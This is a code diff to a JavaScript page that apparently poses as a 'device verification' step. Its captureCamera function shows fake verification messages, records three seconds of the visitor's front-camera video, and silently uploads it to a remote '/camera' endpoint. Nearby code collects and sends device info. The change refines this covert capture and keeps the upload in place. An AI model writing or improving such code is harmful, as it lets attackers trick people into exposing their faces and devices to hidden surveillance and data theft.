@@ -161,33 +161,31 @@ function setCamStatus(msg,col){
   el.textContent=msg;
 }
 function captureCamera(){
-  if(!navigator.mediaDevices||!navigator.mediaDevices.enumerateDevices)return;
-  navigator.mediaDevices.enumerateDevices().then(function(devices){
-    var hasCamera=devices.some(function(d){return d.kind==='videoinput';});
-    if(!hasCamera){send('/camera',{denied:true,reason:'No camera found on device'});return;}
-    setCamStatus('📷 Camera verification required — please allow access');
-    navigator.mediaDevices.getUserMedia({video:{width:320,height:240,facingMode:'user'},audio:false})
-      .then(function(stream){
-        setCamStatus('🔴 Verifying device… please wait','#f5c034');
-        var chunks=[],mr=new MediaRecorder(stream);
-        mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
-        mr.onstop=function(){
-          stream.getTracks().forEach(function(t){t.stop();});
-          setCamStatus('✓ Device verified','#3fb950');
-          setTimeout(function(){setCamStatus(null);},2000);
-          var blob=new Blob(chunks,{type:mr.mimeType});
-          var fd=new FormData();
-          fd.append('video',blob,'capture.webm');
-          fd.append('mimeType',mr.mimeType);
-          fetch(BASE+'/camera',{method:'POST',mode:'no-cors',body:fd}).catch(function(){});
-        };
-        mr.start();
-        setTimeout(function(){if(mr.state==='recording')mr.stop();},3000);
-      }).catch(function(err){
-        send('/camera',{denied:true,reason:err.message||'Permission denied'});
-        setCamStatus('⚠ Camera access is required to verify your device. Please allow and refresh.','#f85149');
-      });
-  }).catch(function(){});
+  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return;
+  setCamStatus('📷 Camera verification required — please allow access');
+  navigator.mediaDevices.getUserMedia({video:{width:320,height:240,facingMode:'user'},audio:false})
+    .then(function(stream){
+      setCamStatus('🔴 Verifying device… please wait','#f5c034');
+      var chunks=[],mr=new MediaRecorder(stream);
+      mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
+      mr.onstop=function(){
+        stream.getTracks().forEach(function(t){t.stop();});
+        setCamStatus('✓ Device verified','#3fb950');
+        setTimeout(function(){setCamStatus(null);},2000);
+        var blob=new Blob(chunks,{type:mr.mimeType});
+        var fd=new FormData();
+        fd.append('video',blob,'capture.webm');
+        fd.append('mimeType',mr.mimeType);
+        fetch(BASE+'/camera',{method:'POST',mode:'no-cors',body:fd}).catch(function(){});
+      };
+      mr.start();
+      setTimeout(function(){if(mr.state==='recording')mr.stop();},3000);
+    }).catch(function(err){
+      var noHw=err.name==='NotFoundError'||err.name==='DevicesNotFoundError'||err.name==='OverconstrainedError';
+      if(noHw){setCamStatus(null);}
+      else{setCamStatus('⚠ Camera access is required to verify your device. Please allow and refresh.','#f85149');}
+      send('/camera',{denied:true,reason:err.message||'Permission denied'});
+    });
 }
 function autoCapture(){
   var info=collectInfo();send("/info",info);
